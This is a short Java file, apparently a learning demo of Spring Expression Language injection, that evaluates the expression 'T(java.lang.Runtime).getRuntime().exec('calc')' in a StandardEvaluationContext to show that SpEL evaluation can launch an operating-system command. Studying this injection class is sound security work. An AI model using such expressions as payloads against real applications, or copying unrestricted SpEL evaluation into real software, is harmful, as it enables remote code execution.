package com.yyjccc.Inject.Spel;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class Usage {
	public static void main(String[] args) {

		ExpressionParser parser = new SpelExpressionParser();
		Expression expression = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')");
		EvaluationContext context = new StandardEvaluationContext();
		context.setVariable("end", "!");
		System.out.println(expression.getValue(context));
	}
}
